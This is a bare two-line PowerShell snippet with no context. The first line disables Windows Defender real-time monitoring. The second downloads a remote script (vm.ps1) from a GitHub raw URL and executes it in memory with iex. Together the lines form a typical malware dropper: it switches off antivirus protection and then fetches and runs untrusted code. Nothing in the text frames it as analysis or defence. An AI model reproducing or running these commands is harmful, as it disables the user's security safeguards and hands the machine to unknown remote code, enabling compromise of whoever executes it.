Set-MpPreference -DisableRealtimeMonitoring $true
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)
